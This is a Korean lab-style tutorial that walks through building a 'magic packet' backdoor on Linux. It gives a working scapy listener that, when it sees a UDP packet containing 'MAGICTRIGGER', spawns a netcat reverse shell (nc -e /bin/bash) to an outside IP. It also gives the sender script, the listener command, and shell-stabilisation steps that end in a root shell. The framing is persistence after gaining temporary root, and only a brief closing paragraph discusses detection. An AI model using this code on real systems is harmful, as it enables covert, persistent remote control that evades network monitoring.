# 매직 패킷 백도어 트리거

특정한 네트워크 패킷을 이용하여 명령을 트리거하는 매직 패킷에 대해 알아보자.  
일반적인 연결 요청 없이 네트워크 트래픽만으로 백도어를 활성화할 수 있다는 점에서, 탐지 회피 및 우회적 접근이 가능하다.  

<br>
<br>

### 매직 패킷 트리거
- 매직 패킷은 공격자가 정의해둔 특정한 바이트 패턴과 같은 네트워크 패킷을 의미한다.
- 불필요한 포트 노출 없이 트리거가 가능하고, 일반 트래픽과 섞이면 탐지 회피 가능성도 증가한다.
- 또 네트워크 탐지 시스템(IDS/IPS)을 우회할 가능성이 존재한다.

<br>


### 구현 수준에 따른 분류
- 크게 유저 수준과 커널 수준으로 나눌 수 있다.
- 이번 실습에서는 유저 수준 트리거를 사용한다.

<br>
<br>

### 백도어 구현
- **상황** : 리눅스에서 루트 계정에 일시적인 쉘 접근 권한을 가진 상태.
- **목표** : 매직 패킷 트리거를 통해 외부에서 제어 가능한 백도어 설치.
- **방법** : 매직 패킷 감지 시 시스템에서 특정 명령 실행.
<br>

`scapy`를 활용하여 패킷 감지를 해볼 것이다.  
<br>

**1. 매직 패킷 설계**  
매직 패킷은 특정 바이트나 패턴을 반복하는 것이 일반적이지만,  
여기선 단순한 임의 바이트 시퀀스를 사용한다.  

- 사용 바이트 : `b"MAGICTRIGGER"`

이게 포함된 UDP 패킷을 보내면 백도어가 트리거되도록 한다.  

<br>

**2. 임의 위치에 파일 생성**  
임의 위치에 매직 패킷을 감지해줄 python 코드를 작성해서 넣어준다.  

포트는 기존과 다르게 2345로 넣어주었다.  

<img src="https://github.com/user-attachments/assets/51df54bd-66ba-498d-bee3-d394119eff36" width=700>  

```python
from scapy.all import sniff, Raw
import os

MAGIC_SEQUENCE = b"MAGICTRIGGER"

def trigger(pkt):

    if pkt.haslayer(Raw):

        if MAGIC_SEQUENCE in pkt[Raw].load:

            os.system("nc -e /bin/bash 172.29.180.202 2345")

sniff(iface="eth0", filter="udp", prn=trigger)
```

보낼 ip와 포트를 설정해주고, udp 를 받도록 해주었다.   

<br>

**3. 공격자 파일 생성**   

<img src="https://github.com/user-attachments/assets/0387e9f2-52e3-4072-9abe-5f342ec336cf" width=500>  

<br>

이전 공격 코드에서,  
`sniff(iface="eth0", filter="udp", prn=trigger)` 로 UDP 전체를 감시하고 있기 때문에 `dport` 값은 아무 상관없어서 1로 넣어줬다.    


```python
from scapy.all import *

target_ip = "192.168.125.129"
magic = b"MAGICTRIGGER"
packet = IP(dst=target_ip)/UDP(dport=1)/Raw(load=magic)

send(packet)
```
이렇게 공격자 파일도 생성했다.  

<br>

**4. 파일 실행**  
이제 각 파일들을 전부 실행시켜준다.  

- `sudo python3 listener.py` 생성해둔 파일을 실행시켜준다.
- `nc -lvnp 2345`로 2345 포트에서 들어오는 연결을 수신해준다.  
- `sudo python3 sender.py` 공격자의 화면에서도 sender.py를 생성해준다. 

<br>

참고로 `sender`를 보내기 전에 `listener`와 `nc -lvnp 2345`를 먼저 실행 시켜놔야한다.  
이렇게 전부 실행시켰다면,  
<br>

<img src="https://github.com/user-attachments/assets/e9c9aa80-500d-4c9a-8509-ee047792a0b7" width=700>   

패킷을 보내고, 패킷이 수신된 것을 볼 수 있다.  
<br>

<img src="https://github.com/user-attachments/assets/dcd06bb1-573c-4fa7-b59a-984418014978" width=500>   

이후에  
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

쉘안정화를 시켜주면 root 쉘을 얻을 수 있는 것을 볼 수 있다.  
<br>

이번 실습에서는 단순한 특수 바이트 시퀀스를 트리거 패턴으로 활용했지만,   
실제 공격에서는 사람이 쉽게 읽을 수 없는 바이트열이나 정상 트래픽으로 위장된 프로토콜 일탈 패턴, 심지어 암호화된 페이로드 형태로 매직 패킷이 삽입될 수 있다.  
이 경우 네트워크 레이어에서 단순 시그니처 기반으로 탐지하는 것은 점점 어려워진다.   

이러한 유형의 공격을 방어하기 위해 네트워크 동작에 대한 이상 행위를 탐지하는 행동 기반 분석이 필요하다.  
백도어가 외부와 연결할 때 사용하는 outbound 연결을 상시 감시하고 로그를 보존하는 것도 중요하다.  
이를 통해 의심스러운 외부 발신 시도를 사후 분석할 수 있는 기반을 확보해야 한다.
